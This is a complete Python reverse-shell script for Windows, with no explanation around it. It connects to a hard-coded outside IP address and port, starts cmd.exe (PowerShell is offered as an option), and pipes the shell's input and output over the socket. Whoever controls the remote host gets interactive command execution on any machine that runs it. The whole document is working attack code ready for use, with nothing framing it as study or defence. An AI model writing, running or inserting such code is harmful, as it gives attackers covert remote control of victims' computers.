
import os
import socket
import subprocess
import threading
import sys

HOST = os.getenv("RS_HOST", "34.128.74.93")
PORT = int(os.getenv("RS_PORT", "1337"))

def main():
    try:
        s = socket.create_connection((HOST, PORT))
    except Exception as e:
        print(f"[!] connect failed: {e}", file=sys.stderr)
        sys.exit(1)

    # Binary file-like wrappers around the socket
    sock_r = s.makefile("rb", buffering=0)
    sock_w = s.makefile("wb", buffering=0)

    # Start cmd.exe (or powershell.exe)
    try:
        proc = subprocess.Popen(
            ["cmd.exe"],  # or ["powershell.exe", "-NoLogo"]
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            bufsize=0
        )
    except Exception as e:
        print(f"[!] failed to start shell: {e}", file=sys.stderr)
        s.close()
        sys.exit(1)

    # Pump child stdout to the socket
    def pump_proc_to_socket():
        try:
            while True:
                chunk = proc.stdout.read(1)
                if not chunk:
                    break
                sock_w.write(chunk)
                sock_w.flush()
        except Exception:
            pass
        finally:
            try: sock_w.flush()
            except Exception: pass

    t = threading.Thread(target=pump_proc_to_socket, daemon=True)
    t.start()

    # Pump socket input to child stdin
    try:
        while True:
            data = sock_r.read(1)
            if not data:
                break
            proc.stdin.write(data)
            proc.stdin.flush()
    except Exception:
        pass
    finally:
        try: proc.terminate()
        except Exception: pass
        try: s.close()
        except Exception: pass

if __name__ == "__main__":
    main()
